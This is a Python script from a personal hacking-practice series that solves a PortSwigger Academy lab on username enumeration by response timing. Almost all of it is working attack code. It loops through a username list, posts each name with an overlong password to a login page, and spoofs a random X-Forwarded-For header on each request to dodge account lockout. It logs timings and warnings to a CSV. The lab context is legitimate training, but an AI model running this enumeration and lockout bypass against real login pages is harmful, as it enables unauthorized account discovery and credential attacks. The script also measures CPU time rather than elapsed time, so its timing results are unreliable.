# DAY 3 OF 100DAYSOFCODE / 100DAYSOFHACKITYWACKITY
# PORTSWIGGER ACADEMY - Lab: Enumeration via response timing

# Used for making HTTP requests!
# to install: pip install requests
# https://realpython.com/python-requests/
import requests

# Used for parsing the HTML we get back in our response!
# to install: pip install lxml
# https://docs.python-guide.org/scenarios/scrape/
from lxml import html

# Used for measuring response times! 
# https://docs.python.org/3/library/time.html
from time import process_time

# Used for making our spreadsheet
# pip install pandas

import pandas as pd 
from random import randrange
# get the list of usernames from the usernames.txt file
# https://www.tutorialspoint.com/How-to-read-text-file-into-a-list-or-array-with-Python
f = open('./usernames.txt', 'r+')
usernames = [line for line in f.readlines()]
f.close()

def bruteForcePossibleCredentials(link, username, password, ipaddress):

    
    # https://www.geeksforgeeks.org/time-process_time-function-in-python/
    start_time = process_time()

    # make dat post request
    # use an X-Forwarded-For header with a differing IP address so we can bypass getting locked out
    # and having to wait 30 minutes 
    response = requests.post(link, 
                          data={'username': username, 'password': password},
                          headers={'X-Forwarded-For': ipaddress})

    end_time = process_time()
    elapsed = (end_time - start_time)*10000

    tree = html.fromstring(response.content)

    # the html element that tells us if our username is wrong is a <p> with
    # a class of "is-warning"
    # so we grab just that element from the response content 
    warning = tree.xpath('//p[@class="is-warning"]/text()')[0]

    resultArr = [username, "long", ipaddress, warning, elapsed]

    return resultArr


def generateRandomIP():
    ipStr = ""
    for i in range(4):
        ipStr += str(randrange(10)) + "."
    
    ipStr = ipStr[:-1]
    return ipStr


csvArr = []
csvHeaders = ["username", "password", "ip", "warning", "time"]

csvArr.append(csvHeaders)
longpw = "A" * 1000
postUrl = 'https://acf51f721f258dbd80cd88f6003d00f4.web-security-academy.net/login'
print("Starting loop...")
for user in usernames:
    # print("~~Iterating~~")
    ip = generateRandomIP()
    csvArr.append(bruteForcePossibleCredentials(postUrl, user, longpw, ip))
print("All done!")


df = pd.DataFrame(csvArr)

df.to_csv('02182021_attempt4_username_response_times_results.csv')

